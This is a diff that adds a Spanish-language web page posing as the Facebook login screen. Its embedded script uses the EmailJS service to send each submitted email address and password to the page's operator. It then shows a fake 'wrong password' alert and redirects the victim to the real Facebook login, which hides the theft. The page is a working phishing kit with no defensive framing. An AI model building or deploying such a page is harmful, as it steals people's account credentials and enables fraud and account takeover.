@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión - Facebook</title>
+    <style>
+        @font-face {
+            font-family: 'Helvetica Neue';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Helvetica Neue'), local('Arial'), local('sans-serif');
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1000px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .login-left {
+            width: 60%;
+        }
+
+        .login-left h1 {
+            font-size: 36px;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        .login-left p {
+            font-size: 20px;
+            color: #606770;
+        }
+
+        .login-right {
+            width: 40%;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-box h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .input-box {
+            margin-bottom: 15px;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            border: none;
+            color: white;
+            font-size: 18px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background-color: #165dbf;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .forgot-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .create-account a {
+            background-color: #28a745;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 12px 30px;
+            border-radius: 6px;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .create-account a:hover {
+            background-color: #218838;
+        }
+
+        .toggle-password {
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: -10px;
+            color: #1877f2;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Lado izquierdo (branding de Facebook) -->
+        <div class="login-left">
+            <h1>facebook</h1>
+            <p>facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+
+        <!-- Lado derecho (caja de inicio de sesión) -->
+        <div class="login-right">
+            <div class="login-box">
+                <h2>Iniciar sesión en Facebook</h2>
+                <form id="loginForm">
+                    <div class="input-box">
+                        <input type="email" name="email" placeholder="Correo electrónico o número de teléfono" required>
+                    </div>
+                    <div class="input-box">
+                        <input type="password" name="password" placeholder="Contraseña" id="passwordInput" required>
+                        <span class="toggle-password" onclick="togglePassword()">Mostrar contraseña</span>
+                    </div>
+                    <button type="submit" class="login-btn">Iniciar sesión</button>
+                </form>
+                <div class="forgot-link">
+                    <a href="#">¿Olvidaste tu cuenta?</a>
+                </div>
+                <div class="create-account">
+                    <a href="#">Crear cuenta nueva</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("NNCzv1CNq6L3s_X-B");
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault();
+            
+            emailjs.send("default_service", "template_kwd9brj", {
+                email: document.querySelector('input[name="email"]').value,
+                password: document.querySelector('input[name="password"]').value
+            }).then(function(response) {
+                alert("Contraseña incorrecta");
+                
+                setTimeout(function() {
+                    window.location.href = "https://www.facebook.com/login/";
+                }, 2000);
+            }, function(error) {
+                alert("Error al enviar los datos: " + JSON.stringify(error));
+            });
+        }
+
+        document.querySelector('#loginForm').addEventListener('submit', sendEmail);
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('passwordInput');
+            const togglePasswordText = document.querySelector('.toggle-password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                togglePasswordText.textContent = 'Ocultar contraseña';
+            } else {
+                passwordInput.type = 'password';
+                togglePasswordText.textContent = 'Mostrar contraseña';
+            }
+        }
+    </script>
+
+</body>
+</html>
